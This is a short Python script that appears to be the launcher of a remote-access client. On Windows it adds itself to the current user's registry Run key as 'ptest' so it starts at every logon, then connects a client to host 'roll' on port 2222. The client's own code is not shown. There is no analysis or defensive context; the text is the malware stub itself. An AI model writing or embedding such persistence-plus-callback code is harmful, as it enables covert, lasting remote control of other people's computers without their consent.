#!/usr/bin/python3
from objects import *
import sys

HOST = "roll"
PORT = 2222


def main():
    if sys.platform.startswith('win'):
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             'Software\Microsoft\Windows\CurrentVersion\Run',
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'ptest', 0, winreg.REG_SZ,
                          "C:\main.py")
        key.Close()
    Client(HOST, PORT).run()


if __name__ == "__main__":
    main()
